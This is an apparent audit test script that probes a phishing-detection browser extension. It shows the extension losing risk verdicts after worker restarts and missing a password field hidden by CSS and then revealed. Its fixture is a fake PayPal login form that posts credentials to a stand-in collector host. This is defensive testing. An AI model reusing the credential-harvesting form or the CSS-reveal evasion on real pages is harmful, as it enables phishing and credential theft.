/* Read-only audit probes against the current production code. No network to live sites. */
const fs = require('node:fs');
const path = require('node:path');
const assert = require('node:assert/strict');
const { JSDOM } = require('jsdom');
const root = path.resolve(__dirname, '../..');
const output = {};
const tick = () => new Promise(resolve => setImmediate(resolve));

async function runtimeProbes() {
  // Reuse the regression suite's fake browser, but retain session storage across
  // two separate worker instances to model a Manifest V3 worker shutdown.
  let source = fs.readFileSync(path.join(root, 'extension/tests/unit/runtime-integration.test.js'), 'utf8');
  source = source.slice(0, source.indexOf('async function testWorker()'))
    .replace('function worker(settings = {})', 'function worker(settings = {}, persistedSession = {})')
    .replace('const session = {};', 'const session = persistedSession;');
  const moduleBox = { exports: {} };
  new Function('require', 'module', '__dirname', source + '\nmodule.exports = worker;')(
    require, moduleBox, path.join(root, 'extension/tests/unit'));
  const worker = moduleBox.exports;
  const topUrl = 'https://college.test/login?token=PRIVATE#SECRET';
  const frames = [{ frameId: 0, documentId: 'doc-0', url: topUrl },
    { frameId: 7, documentId: 'doc-7', url: 'https://embedded.test/phish' }];
  const before = worker();
  before.setFrames(frames);
  await before.scan(1);
  await before.scan(1, { testScore: 90, testOutcome: 'HIGH_RISK' }, { frameId: 7, url: frames[1].url });
  assert.equal(before.session.tab_0.outcome, 'HIGH_RISK');
  const after = worker({}, before.session);
  after.setFrames(frames);
  await after.scan(2);
  const reopened = await after.send({ type: 'GET_TAB_RESULT', tabId: 0, url: topUrl });
  assert.equal(reopened.result.outcome, 'SAFE');
  output.workerRestart = { before: 'HIGH_RISK', afterTopOnlyRescan: reopened.result.outcome,
    inspectedFrames: reopened.result.inspectedFrames, coverage: reopened.result.coverage,
    recoveryRequested: after.sends.some(item => item.message.type === 'REQUEST_RESCAN'),
    method: 'actual worker; fake browser/scorer; session retained, worker memory recreated' };

  const reputation = worker({ reputationEnabled: true, reputationEndpoint: 'https://reputation.test/check' });
  await reputation.scan(1);
  reputation.requests[0].resolve('malicious');
  await tick();
  const knownMalicious = reputation.session.tab_0.outcome;
  await reputation.scan(2);
  const rescanned = reputation.session.tab_0.outcome;
  reputation.requests[1].resolve('unknown');
  await tick();
  assert.equal(knownMalicious, 'HIGH_RISK');
  assert.equal(rescanned, 'SAFE');
  output.reputationReset = { priorReport: knownMalicious, sameHostRescan: rescanned,
    afterUnknownResponse: reputation.session.tab_0.outcome, requests: reputation.requests.length,
    method: 'actual worker, fake browser/scorer and controlled remote responses' };
}

async function styleProbe() {
  const dom = new JSDOM('<title>PayPal Login</title><style>#secret {display:none}</style><form action="https://collector.invalid/collect" method="post"><input id="secret" type="password"></form>',
    { url: 'https://portal.test/', runScripts: 'outside-only' });
  await tick();
  const w = dom.window;
  w.PHISH_GUARD_PSL = JSON.parse(fs.readFileSync(path.join(root, 'extension/src/shared/public-suffix-rules.json')));
  for (const file of ['shared/constants.js', 'shared/domain-utils.js', 'shared/model-policy.js', 'content/url-features.js', 'content/form-features.js', 'content/dom-features.js']) {
    w.eval(fs.readFileSync(path.join(root, 'extension/src', file), 'utf8'));
  }
  const sends = [];
  const timers = new Map(); let next = 0; let poll;
  w.setTimeout = fn => { timers.set(++next, fn); return next; };
  w.clearTimeout = id => timers.delete(id);
  w.setInterval = fn => { poll = fn; return 1; };
  w.clearInterval = () => {};
  w.PhishGuard.browser = { runtime: { sendMessage: m => { sends.push(m); return Promise.resolve(); }, onMessage: { addListener() {} } } };
  w.eval(fs.readFileSync(path.join(root, 'extension/src/content/content-script.js'), 'utf8'));
  const initial = sends.at(-1).payload;
  w.document.styleSheets[0].insertRule('#secret {display:block}', 1);
  await tick();
  poll(); // Root discovery polls do not reanalyze unchanged roots.
  const pending = [...timers.values()]; timers.clear(); pending.forEach(fn => fn());
  await tick();
  const freshForm = w.PhishGuard.extractFormFeatures();
  const fresh = { ...w.PhishGuard.extractUrlFeatures(), ...freshForm, ...w.PhishGuard.extractDomFeatures(freshForm) };
  assert.equal(initial.credential_context, 0);
  assert.equal(fresh.credential_context, 1);
  assert.equal(sends.length, 1);
  output.cssomVisibility = { initialOutcome: w.PhishGuard.scoreEvidence(initial).outcome,
    freshOutcomeIfRescanned: w.PhishGuard.scoreEvidence(fresh).outcome,
    initialCredentialContext: initial.credential_context, freshCredentialContext: fresh.credential_context,
    actualAnalysisMessagesAfterCssomAndRootPoll: sends.length, pendingAnalysisTimers: timers.size,
    method: 'actual extractors/policy/content observer in jsdom; CSSStyleSheet.insertRule' };
  dom.window.close();
}

(async () => {
  await runtimeProbes(); await styleProbe();
  fs.writeFileSync(path.join(__dirname, 'tester-runtime-probes-2026-10-25.json'), JSON.stringify(output, null, 2) + '\n');
  console.log(JSON.stringify(output, null, 2));
})().catch(error => { console.error(error); process.exitCode = 1; });
